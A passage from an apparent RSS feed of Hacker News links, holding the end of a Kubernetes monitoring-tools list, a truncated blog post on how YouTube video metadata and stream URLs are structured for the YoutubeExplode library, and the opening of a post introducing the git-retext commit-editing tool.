<p><span>Cost: Pay for the resources used</span></p>



<h2><b>Monitoring Tools</b></h2>



<h3><b>10. Kubebox</b></h3>



<p><span>Kubebox is a terminal console for Kubernetes cluster which allows you to manage and monitor your cluster-live status with a nice, old-school interface. Kubebox shows your pod resource usage, cluster monitoring, and container logs, etc. Additionally, you can easily navigate to the desired namespace and execute into the desired container for fast troubleshooting/recovery.</span></p>



<p><span>Link:</span><a href="https://github.com/astefanutti/kubebox" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://github.com/astefanutti/kubebox</span></a></p>



<p><span>Cost: Free</span></p>



<h3><b>11. Kubernetes Operational View (Kube-ops-view)</b></h3>



<p><span>Kube-ops-view is a read-only system dashboard for multiple K8s clusters. With Kube-ops-view you can easily navigate between your cluster and monitor nodes as well as your pod’s healthiness. Kube-ops-view animates some Kubernetes processes such as pod creation and termination. It also uses Heapster as a source of data.</span></p>



<p><span>Link:</span><a href="https://github.com/hjacobs/kube-ops-view" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://github.com/hjacobs/kube-ops-view</span></a></p>



<p><span>Cost: Free</span></p>



<h3><b>12. Kubetail</b></h3>



<p><span>Kubetail is a small bash script which allows you to aggregate logs from multiple pods into one stream. The initial Kubetail version doesn’t have filtering or highlighting features, but there is an additional Kubetail fork on Github. This can form and perform logs coloring using multitail tools.</span></p>



<p><span>Link:</span><a href="https://github.com/johanhaleby/kubetail" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://github.com/johanhaleby/kubetail</span></a></p>



<p><span>Cost: Free</span></p>



<h3><b>13. Kubewatch</b></h3>



<p><span>Kubewatch is a Kubernetes watcher which can publish K8s events to the team communication app, Slack. Kubewatch runs as a pod inside Kubernetes clusters and monitors changes that occur in the system. You can specify the notifications you want to receive by editing the configuration file.</span></p>



<p><span>Link:</span><a href="https://github.com/bitnami-labs/kubewatch" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://github.com/bitnami-labs/kubewatch</span></a></p>



<p><span>Cost: Free</span></p>



<figure><img src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/weavescope.png" alt="#weavescope" width="150" height="150" srcset="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/weavescope.png 512w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/weavescope-100x100.png 100w" sizes="(max-width: 150px) 100vw, 150px" data-srcset="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/weavescope.png 512w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/weavescope-100x100.png 100w" data-src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/weavescope.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption>0 </figcaption></figure>



<h3><b>14. Weave Scope</b></h3>



<p><span>Weave Scope is a troubleshooting and monitoring tool for Docker and Kubernetes clusters. It can automatically generate applications and infrastructure topologies which can help you to identify application performance bottlenecks easily. You can deploy Weave Scope as a standalone application on your local server/laptop, or you can choose the Weave Scope Software as a Service (SaaS) solution on Weave Cloud. With Weave Scope, you can easily group, filter or search containers using names, labels, and/or resource consumption.</span></p>



<p><span>Link:</span><a href="https://www.weave.works/oss/scope/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://www.weave.works/oss/scope/</span></a></p>



<p><span>Cost: Free in standalone mode</span></p>



<p><span>Standard mode – 30% per month (free 30-day trial)</span></p>



<p><span>Enterprise mode – 150$ per node/month</span></p>



<figure><img src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2020/07/prometheusPostImage-830x370-1.png" alt="" width="372" height="165" srcset="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2020/07/prometheusPostImage-830x370-1.png 830w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2020/07/prometheusPostImage-830x370-1-100x45.png 100w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2020/07/prometheusPostImage-830x370-1-768x342.png 768w" sizes="(max-width: 372px) 100vw, 372px" data-srcset="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2020/07/prometheusPostImage-830x370-1.png 830w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2020/07/prometheusPostImage-830x370-1-100x45.png 100w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2020/07/prometheusPostImage-830x370-1-768x342.png 768w" data-src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2020/07/prometheusPostImage-830x370-1.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption>						</figcaption></figure>



<h3><b>15. Prometheus</b></h3>



<p><span>Prometheus monitoring has fast become the go-to tool for Kubernetes monitoring tool. It offers a multi-dimensional data model and a very user-accessible format and protocols. Exposing Prometheus metrics in Kubernetes is a pretty straightforward task. The data scraped is human readable, in a self-explanatory format, and published using a standard HTTP transport.</span></p>



<p><span>Link:</span><a href="https://prometheus.io/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://prometheus.io/</span></a></p>



<p><span>Price: Free</span></p>



<figure><img src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/16-Searchlight.png" alt="#Searchlight" srcset="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/16-Searchlight.png 348w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/16-Searchlight-100x39.png 100w" sizes="(max-width: 348px) 100vw, 348px" data-srcset="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/16-Searchlight.png 348w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/16-Searchlight-100x39.png 100w" data-src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/16-Searchlight.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption>
						</figcaption></figure>



<h3><b>16. Searchlight</b></h3>



<p><span>Searchlight by AppsCode is a Kubernetes operator for Icinga. Searchlight periodically runs various checks on Kubernetes clusters and alerts you via email, SMS or chat if something goes wrong. Searchlight includes a default suite of checks written specifically for Kubernetes. Also, it can enhance Prometheus monitoring with external black-box monitoring and serves as a fallback in case internal systems completely fail.</span></p>



<p><span>Link:</span><a href="https://github.com/appscode/searchlight" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://github.com/appscode/searchlight</span></a></p>



<p><span>Cost: Free</span></p>



<figure><img src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2017/11/cAdvisor.png" alt="cAdvisor" width="210" height="83" data-src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2017/11/cAdvisor.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption>						</figcaption></figure>



<h3><b>17. cAdvisor</b></h3>



<p><span>CAdvisor is installed by default on all cluster nodes to collect metrics for Kubernetes about running containers and nodes. CAdvisor Kubelet exposes these metrics through Kubelet APIs (with a default of one-minute resolution). The Metrics Server identifies all available nodes and calls Kubelet API to get containers and nodes resources usage before exposing the metrics through Kubernetes aggregation API.</span></p>



<p><span>Link:</span><a href="https://github.com/google/cadvisor" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://github.com/google/cadvisor</span></a></p>



<p><span>Price: Free</span></p>



<h3><b>18. Kube-state-metrics</b></h3>



<p><span>kube-state-metrics generates metrics from Kubernetes API objects without modification by listening to the Kubernetes API server. It doesn’t examine the health of individual Kubernetes components so much as it focuses on the health of the various objects inside, such as deployments, nodes and pods.</span></p>



<p><span>Link:</span><a href="https://github.com/kubernetes/kube-state-metrics" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://github.com/kubernetes/kube-state-metrics</span></a></p>



<p><span>Price: Free</span></p>



<figure><img src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/sumo.png" alt="#sumologic" width="150" height="150" srcset="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/sumo.png 225w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/sumo-100x100.png 100w" sizes="(max-width: 150px) 100vw, 150px" data-srcset="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/sumo.png 225w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/sumo-100x100.png 100w" data-src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/sumo.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure>



<h3><b>19. Sumo Logic App</b></h3>



<p><span>The Sumo Logic Kubernetes App offers complete visibility into the worker nodes within your clusters, as well as for their application logs. The app allows users to monitor and troubleshoot container health, replication, load balancing, pod state and hardware resource allocation. The App utilizes</span><a href="https://falco.org/docs/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>Falco</span></a><span> events to monitor and detect anomalous container, application, host, and network activity.</span></p>



<p><span>Link:</span><a href="https://www.sumologic.com/application/kubernetes/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://www.sumologic.com/application/kubernetes/</span></a></p>



<p><span>Price: Professional $108/ month, Enterprise $180/ month</span></p>



<figure><img src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2020/07/dynatrace_web.png" alt="" width="177" height="76" data-src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2020/07/dynatrace_web.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure>



<h3><b>20. Dynatrace</b></h3>



<p><span>Dynatrace OneAgent is container-aware and comes with built-in support for out-of-the-box monitoring of Kubernetes. Dynatrace provides</span><a href="https://www.dynatrace.com/technologies/kubernetes-monitoring/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>full-stack…</span></a></p></div></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://caylent.com/50-useful-kubernetes-tools-for-2020">https://caylent.com/50-useful-kubernetes-tools-for-2020</a></em></p>]]>
            </description>
            <link>https://caylent.com/50-useful-kubernetes-tools-for-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-24893746</guid>
            <pubDate>Mon, 26 Oct 2020 07:51:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reverse-Engineering YouTube (2017)]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24893169">thread link</a>) | @quyleanh
<br/>
October 25, 2020 | https://tyrrrz.me/blog/reverse-engineering-youtube | <a href="https://web.archive.org/web/*/https://tyrrrz.me/blog/reverse-engineering-youtube">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Almost a year ago, I started developing <a href="https://github.com/Tyrrrz/YoutubeExplode">YoutubeExplode</a>, a library that scraps information on YouTube videos and lets you download them. Originally, my main motivation for developing it was simply to gain experience, as the task involved a lot of research and reverse-engineering. Nowadays, YoutubeExplode is arguably the most consistent and robust .NET library for dealing with YouTube.</p>
<p>Since this is a relatively popular discussion topic among many beginner developers, I thought that I could help out by sharing the knowledge I found by spending dozens of hours staring at Chrome Developer Tools.</p>
<p><em>Note: even though the base principles explained here are unlikely to change, some information in this post may become outdated. This post is relevant to YoutubeExplode v4.1 (16-Feb-2018).</em></p>
<h2>Getting video metadata</h2>
<p>In order to find and resolve media streams, you need to first get video metadata. There are a few ways to do it, but the most reliable one is by querying an AJAX endpoint used internally by YouTube’s iframe embed API. The format is as follows: <a href="https://www.youtube.com/get_video_info?video_id=%7BvideoId%7D">https://www.youtube.com/get_video_info?video_id={videoId}</a>.</p>
<p>The request can take a lot of different parameters, but at a minimum it needs a video ID — the value in the URL that comes after <code>/watch?v=</code>, for example <code>e_S9VvJM1PI</code>.</p>
<p>The response contains URL-encoded metadata, which has to be decoded first before it’s usable. After that, you can map the parameter names to values in a dictionary for easier access. Some parameter values are nested objects themselves, so they can in turn be mapped to nested dictionaries.</p>
<p>Here’s an example of the decoded metadata (truncated for brevity):</p>
<div data-language="ini"><pre><code><span>status</span><span><span>=</span>ok</span>
<span>view_count</span><span><span>=</span>24022293</span>
<span>muted</span><span><span>=</span>0</span>
<span>use_cipher_signature</span><span><span>=</span>True</span>
<span>iurl</span><span><span>=</span>https://i.ytimg.com/vi/e_S9VvJM1PI/hqdefault.jpg</span>
<span>iurlhq720</span><span><span>=</span>https://i.ytimg.com/vi/e_S9VvJM1PI/hq720.jpg</span>
<span>video_id</span><span><span>=</span>e_S9VvJM1PI</span>
<span>avg_rating</span><span><span>=</span>4.8990560233</span>
<span>videostats_playback_base_url</span><span><span>=</span>https://s.youtube.com</span>
<span>ucid</span><span><span>=</span>UCKvT-8xU_BTJGvsQ5lR23TQ</span>
<span>iurlmq</span><span><span>=</span>https://i.ytimg.com/vi/e_S9VvJM1PI/mqdefault.jpg</span>
<span>thumbnail_url</span><span><span>=</span>https://i.ytimg.com/vi/e_S9VvJM1PI/default.jpg</span>
<span>loudness</span><span><span>=</span>-18.5090007782</span>
<span>pltype</span><span><span>=</span>content</span>
<span>cl</span><span><span>=</span>176519171</span>
<span>author</span><span><span>=</span>IconForHireVEVO</span>
<span>ptk</span><span><span>=</span>youtube_single</span>
<span>is_listed</span><span><span>=</span>1</span>
<span>allow_embed</span><span><span>=</span>1</span>
<span>short_view_count_text</span><span><span>=</span>24M views</span>
<span>relative_loudness</span><span><span>=</span>2.4909992218</span>
<span>fmt_list</span><span><span>=</span>43/640x360,18/640x360,36/426x240,17/256x144,13/256x144</span>
<span>has_cc</span><span><span>=</span>False</span>
<span>title</span><span><span>=</span>Icon For Hire - Make A Move</span>
<span>iurlmaxres</span><span><span>=</span>https://i.ytimg.com/vi/e_S9VvJM1PI/maxresdefault.jpg</span>
<span>keywords</span><span><span>=</span>Icon,For,Hire,Make,Move,Tooth,Nail,(TNN),Rock</span>
<span>length_seconds</span><span><span>=</span>184</span>
<span>allow_ratings</span><span><span>=</span>1</span>
<span>iurlsd</span><span><span>=</span>https://i.ytimg.com/vi/e_S9VvJM1PI/sddefault.jpg</span>
<span>iurlhq</span><span><span>=</span>https://i.ytimg.com/vi/e_S9VvJM1PI/hqdefault.jpg</span>
<span>url_encoded_fmt_stream_map</span><span><span>=</span>...</span>
<span>adaptive_fmts</span><span><span>=</span>...</span>
<span>dashmpd</span><span><span>=</span>...</span></code></pre></div>
<p>As you can see, there is quite a lot of information that can be extracted straight away.</p>
<p>Let’s also look at some important optional parameters that this request can take:</p>
<ul>
<li><code>hl</code> — name of the culture used to localize some strings. If not set, it defaults to culture inferred from your IP. Use <code>hl=en</code> to force English language on all strings.</li>
<li><code>el</code> — type of YouTube page from where the request was made. This decides what kind of information will be available in the response. In some cases, you will need to set this parameter to a certain value depending on the type of the video, in order to avoid errors. Defaults to <code>embedded</code>.</li>
<li><code>sts</code> — some kind of session identifier, used to synchronize information between requests. Defaults to empty.</li>
</ul>
<h3>The “el” parameter</h3>
<p>The <code>el</code> request parameter can take multiple values and it affects what kind of data you will receive as a response. There are only a few that actually matter though, so I’ll list them here:</p>
<ul>
<li><code>embedded</code>, the default value. YouTube uses this when requesting information for embedded videos. Doesn’t work with videos that aren’t embeddable, but works with age-restricted videos.</li>
<li><code>detailpage</code>, alternative value, contains a bit more info. Conversely, works with videos that aren’t embeddable, but doesn’t work with age-restricted videos.</li>
</ul>
<p>YoutubeExplode uses <code>el=embedded</code> for the first query. If it fails because the video cannot be embedded, it then retries with <code>el=detailpage</code>.</p>
<h3>Handling errors</h3>
<p>When the request fails, the response will contain only a few fields:</p>
<ul>
<li><code>status</code> — which is equal to <code>fail</code>.</li>
<li><code>errorcode</code> — an integer code that identifies the error.</li>
<li><code>reason</code> — text message that explains why the video is not available.</li>
</ul>
<p>Error codes seem to be very generic and most of the time it’s either <code>100</code> or <code>150</code> so they aren’t very useful at determining what went wrong.</p>
<h3>Paid videos</h3>
<p>Some videos need to be purchased before they can be watched. In such cases, there will be:</p>
<ul>
<li><code>requires_purchase</code>, which equal to <code>1</code>.</li>
<li><code>ypc_vid</code>, ID of a preview video which can be watched for free.</li>
</ul>
<h2>Resolving media streams</h2>
<p>Media streams and their metadata come in many different forms.</p>
<h3>Muxed streams</h3>
<p>Multiplexed (muxed) streams are the type that contain both video and audio tracks in the same stream. YouTube provides these streams only in low qualities — the best they can be is 720p30.</p>
<p>Metadata for these streams is contained within the URL-encoded response mentioned earlier, inside the <code>url_encoded_fmt_stream_map</code> parameter. To extract it, you simply need to split the value by <code>,</code> and then URL-decode each part.</p>
<p>This is how decoded metadata looks, for an individual muxed stream:</p>
<div data-language="ini"><pre><code><span>itag</span><span><span>=</span>43</span>
<span>type</span><span><span>=</span>video/webm; codecs="vp8.0, vorbis"</span>
<span>fallback_host</span><span><span>=</span>redirector.googlevideo.com</span>
<span>url</span><span><span>=</span>https://r12---sn-3c27sn7k.googlevideo.com/videoplayback?itag=43&amp;lmt=1367519763212098&amp;ipbits=0&amp;key=yt6&amp;mime=video%2Fwebm&amp;expire=1511401259&amp;mn=sn-3c27sn7k&amp;mm=31&amp;ms=au&amp;mv=m&amp;mt=1511379591&amp;ei=y9IVWuuyKI-YdLvnm8AO&amp;sparams=dur%2Cei%2Cgcr%2Cid%2Cinitcwndbps%2Cip%2Cipbits%2Citag%2Clmt%2Cmime%2Cmm%2Cmn%2Cms%2Cmv%2Cnh%2Cpl%2Cratebypass%2Crequiressl%2Csource%2Cexpire&amp;ip=255.255.255.255&amp;id=o-AJuM11wvxuVl2WBgfb3nr6zbmXsFGQvhMelDobZ_KOrE&amp;nh=IgpwcjAxLmticDAxKgkxMjcuMC4wLjE&amp;requiressl=yes&amp;gcr=ua&amp;source=youtube&amp;ratebypass=yes&amp;pl=24&amp;initcwndbps=1112500&amp;dur=0.000</span>
<span>s</span><span><span>=</span>9599599594B0133328AA570AE0129E58478D7BCE9D226F.15ABC404267945A3F64FB4E42074383FC4FA80F5</span>
<span>quality</span><span><span>=</span>medium</span></code></pre></div>
<p>You will be interested in the following properties:</p>
<ul>
<li><code>itag</code> — integer code that identifies the type of stream.</li>
<li><code>type</code> — MIME type and codecs.</li>
<li><code>url</code> — URL that serves the stream.</li>
<li><code>s</code> — cipher signature used to protect the stream (if present).</li>
</ul>
<p>Note: I’ve encountered cases when <a href="https://github.com/Tyrrrz/YoutubeExplode/issues/36">some of the muxed streams were removed</a> despite still appearing in the metadata. Therefore it’s recommended to send HEAD requests to check that each stream is still available. You can get content length as well while you’re at it, since it’s not present in the metadata.</p>
<h3>Adaptive streams</h3>
<p>YouTube also uses video-only and audio-only streams. These come at highest available qualities, with no limitations.</p>
<p>Similarly to muxed streams, metadata for these streams can be extracted from <code>adaptive_fmts</code> parameter. Here’s how it looks:</p>
<div data-language="ini"><pre><code><span>itag</span><span><span>=</span>134</span>
<span>lmt</span><span><span>=</span>1507180885248732</span>
<span>clen</span><span><span>=</span>10889173</span>
<span>size</span><span><span>=</span>640x360</span>
<span>quality_label</span><span><span>=</span>360p</span>
<span>bitrate</span><span><span>=</span>638590</span>
<span>index</span><span><span>=</span>709-1196</span>
<span>projection_type</span><span><span>=</span>1</span>
<span>url</span><span><span>=</span>https://r12---sn-3c27sn7k.googlevideo.com/videoplayback?itag=134&amp;lmt=1507180885248732&amp;ipbits=0&amp;key=yt6&amp;mime=video%2Fmp4&amp;expire=1511401259&amp;aitags=134&amp;mn=sn-3c27sn7k&amp;mm=31&amp;ms=au&amp;mv=m&amp;mt=1511379591&amp;ei=y9IVWuuyKI-YdLvnm8AO&amp;sparams=aitags%2Cclen%2Cdur%2Cei%2Cgcr%2Cgir%2Cid%2Cinitcwndbps%2Cip%2Cipbits%2Citag%2Clmt%2Cmime%2Cmm%2Cmn%2Cms%2Cmv%2Cnh%2Cpl%2Crequiressl%2Csource%2Cexpire&amp;ip=255.255.255.255&amp;clen=10889173&amp;id=o-AJuM11wvxuVl2WBgfb3nr6zbmXsFGQvhMelDobZ_KOrE&amp;gir=yes&amp;nh=IgpwcjAxLmticDAxKgkxMjcuMC4wLjE&amp;requiressl=yes&amp;gcr=ua&amp;source=youtube&amp;pl=24&amp;initcwndbps=1112500&amp;dur=183.850</span>
<span>fps</span><span><span>=</span>30</span>
<span>s</span><span><span>=</span>D68D68D685A42CD39B87D2AC677C8B34FA2DE3A1F3A9A5.902A1E29122D7018F6AC7C1EAFA4A51BE84C3A5C</span>
<span>type</span><span><span>=</span>video/mp4;+codecs="avc1.4d401e"</span>
<span>init</span><span><span>=</span>0-708</span></code></pre></div>
<p>Adaptive streams have a slightly extended set of properties. I’ll list the useful ones:</p>
<ul>
<li><code>itag</code> — integer code that identifies the type of stream.</li>
<li><code>type</code> — MIME type and codecs.</li>
<li><code>url</code> — URL that serves the stream.</li>
<li><code>s</code> — cipher signature used to protect the stream (if present).</li>
<li><code>clen</code> — content length of the stream in bytes.</li>
<li><code>bitrate</code> — stream bitrate in kbit/sec.</li>
<li><code>size</code> — video resolution (video-only).</li>
<li><code>fps</code> — video framerate (video-only).</li>
</ul>
<h3>Adaptive streams in DASH manifest</h3>
<p>Video info may contain URL of a DASH manifest inside the <code>dashmpd</code> parameter. It’s not always present and some videos might never have it at all.</p>
<p>To resolve metadata of these streams, you need to first download the manifest using the provided URL. Sometimes a manifest can be protected. If it is, you should be able to find the signature inside the URL — it’s the value separated by slashes that comes after <code>/s/</code>.</p>
<p>Streams in DASH can also be segmented — each segment starting at a given point and lasting only a second or two. This is the type that your browser normally uses when playing a video on YouTube — it lets it easily adjust quality based on network conditions. Segmented streams are also used for livestream videos. This post will not be covering them, however, as processing them is not required to download videos.</p>
<p>The DASH manifest follows <a href="http://standards.iso.org/ittf/PubliclyAvailableStandards/MPEG-DASH_schema_files/DASH-MPD.xsd">this XML schema</a>. You can parse the stream metadata if you go through all descendant nodes of type <code>Representation</code>. Here’s how they appear:</p>
<div data-language="xml"><pre><code><span><span><span>&lt;</span>Representation</span> <span>id</span><span><span>=</span><span>"</span>133<span>"</span></span> <span>codecs</span><span><span>=</span><span>"</span>avc1.4d4015<span>"</span></span> <span>width</span><span><span>=</span><span>"</span>426<span>"</span></span>
                <span>height</span><span><span>=</span><span>"</span>240<span>"</span></span> <span>startWithSAP</span><span><span>=</span><span>"</span>1<span>"</span></span> <span>maxPlayoutRate</span><span><span>=</span><span>"</span>1<span>"</span></span>
                <span>bandwidth</span><span><span>=</span><span>"</span>246787<span>"</span></span> <span>frameRate</span><span><span>=</span><span>"</span>30<span>"</span></span> <span>mediaLmt</span><span><span>=</span><span>"</span>1507180947831345<span>"</span></span><span>&gt;</span></span>
  <span><span><span>&lt;</span>BaseURL</span> <span>contentLength</span><span><span>=</span><span>"</span>4436318<span>"</span></span><span>&gt;</span></span>https://r12---sn-3c27sn7k.googlevideo.com/videoplayback?id=7bf4bd56f24cd4f2<span title="&amp;">&amp;amp;</span>itag=133<span title="&amp;">&amp;amp;</span>source=youtube<span title="&amp;">&amp;amp;</span>requiressl=yes<span title="&amp;">&amp;amp;</span>ei=Bt4VWqLOJMT3NI3qjPgB<span title="&amp;">&amp;amp;</span>ms=au<span title="&amp;">&amp;amp;</span>gcr=ua<span title="&amp;">&amp;amp;</span>mv=m<span title="&amp;">&amp;amp;</span>pl=24<span title="&amp;">&amp;amp;</span>mn=sn-3c27sn7k<span title="&amp;">&amp;amp;</span>initcwndbps=1143750<span title="&amp;">&amp;amp;</span>mm=31<span title="&amp;">&amp;amp;</span>nh=IgpwcjAxLmticDAxKgkxMjcuMC4wLjE<span title="&amp;">&amp;amp;</span>ratebypass=yes<span title="&amp;">&amp;amp;</span>mime=video/mp4<span title="&amp;">&amp;amp;</span>gir=yes<span title="&amp;">&amp;amp;</span>clen=4436318<span title="&amp;">&amp;amp;</span>lmt=1507180947831345<span title="&amp;">&amp;amp;</span>dur=183.850<span title="&amp;">&amp;amp;</span>mt=1511382418<span title="&amp;">&amp;amp;</span>key=dg_yt0<span title="&amp;">&amp;amp;</span>s=7227CB6B79F7C702BB11275F9D71C532EB7E72046.DD6F06570E470E0E8384F74B879F79475D023A64A64<span title="&amp;">&amp;amp;</span>signature=254E9E06DF034BC66D29B39523F84B33D5940EE3.1F4C8A5645075A228BB0C2D87F71477F6ABFFA99<span title="&amp;">&amp;amp;</span>ip=255.255.255.255<span title="&amp;">&amp;amp;</span>ipbits=0<span title="&amp;">&amp;amp;</span>expire=1511404134<span title="&amp;">&amp;amp;</span>s…</code></pre></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tyrrrz.me/blog/reverse-engineering-youtube">https://tyrrrz.me/blog/reverse-engineering-youtube</a></em></p>]]>
            </description>
            <link>https://tyrrrz.me/blog/reverse-engineering-youtube</link>
            <guid isPermaLink="false">hacker-news-small-sites-24893169</guid>
            <pubDate>Mon, 26 Oct 2020 05:49:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Git-Retext]]>
            </title>
            <description>
<![CDATA[
Score 32 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24893024">thread link</a>) | @da-x
<br/>
October 25, 2020 | https://blog.aloni.org/posts/gitology-2-git-retext/ | <a href="https://web.archive.org/web/*/https://blog.aloni.org/posts/gitology-2-git-retext/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <div id="mobile-panel">
                    



<article>
    
    

    <div>
      <p>This is the second post in a series to expand on various utilities I wrote to
assist my work with Git.  Some of these utilities are located in a repository
on Github called <a href="https://github.com/da-x/misc-gitology">misc-gitology</a>.</p>
<p>Previous post: <a href="https://blog.aloni.org/posts/gitology-1-git-flip-history">#1</a>.</p>
<p>Today I'll introduce the commit rewriter - <code>git-retext</code>.</p>
<h2 id="familiar-ways-of-git-history-editing">Familiar ways of Git history editing</h2>
<p>In the previous post I mentioned the desire to present a clear Git history to
reviewers. Sometimes, we are reviewing our own unpublished Git history and
would like to do some polishing here and there before pushing it to a
remote repository.</p>
<p>There are multitude of ways in which editing the history can be done:</p>
<ul>
<li><code>git commit --amend</code>, with or without <code>-a</code> (in the later <code>git add</code> is used). This
takes care of the <code>HEAD</code> commit, but not commits that are earlier to it.</li>
<li><code>git rebase</code>, where you labor on a fixup commit or a set of them,
with or without <code>--interactive</code>, with or without <code>--autosquash</code>, so that
the fixup changes amend commits further down the history. There are tools such
as <a href="https://github.com/tummychow/git-absorb">git-absorb</a> that can be used to
automate creation of fixup commits.</li>
<li><code>git-filter-branch</code>, a big hammer that lets you run a command per a commit,
where the result of a command is the rewritten tree. Obviously not
quite suitable for easy 'final touches'.</li>
<li>Editor environment features. In Emacs, <a href="https://magit.vc/">Magit</a>, and in
Vim, <a href="https://github.com/jreybert/vimagit">Vimagit</a>, and possibly other editors
have their own Git integrations, some are elaborate enough to ease on editing
the history. However, to each his own, and belaboring on a certain editor
environment would get us off-topic.</li>
</ul>
<h2 id="a-new-way-git-retext">A new way - <code>git-retext</code></h2>
<p>In the process of reviewing, we are most likely looking at diffs. What if it
was possible in an environment-independent way, to just edit the diff? </p>
<p>In the pre-cursor to the invention of Git, developers used emails (and some are
still using emails) in order to pass along changes to one another. The <code>git format-patch</code> command knows how to turn a list of commits into such emails. As
plain text emails can be easily edited by a text editor, it stands to reason
that we can edit changes in-place, if we momentarily turn commits into emails
and back.</p>
<p>This is what <code>git-retext</code> essentially lets you do.</p>
<p>For example, we want to edit the most recent commit in the history. Let's issue
the command:</p>

<p>This <code>git-retext</code> command turns the <code>HEAD~1..HEAD</code> range into emails and we
immediately find ourselves thrown into editing in the default text editor that
we configured, either in Git's configuration, or <code>EDITOR</code> environment variable.
The "thrown into editor" situation should not be foreign to Git users, as it is
done in the default <code>git commit</code> or <code>git rebase -i</code> workflows.</p>
<p>Here's an example for such <code>git-retext HEAD~1</code> invocation at one of my
repositories:</p>
<div><div><pre><span>From bbb92d7cc4ac33bd0e368164d555e4e93a66e658 Mon Sep 17 00:00:00 2001
From: Dan Aloni &lt;alonid@gmail.com&gt;
Date: Thu, 21 May 2020 09:56:01 +0300
Subject: [PATCH] Apply random rotation for new piece

By applying a random set of rotation, the new piece is effectively
rotated to all possible rotations.

---
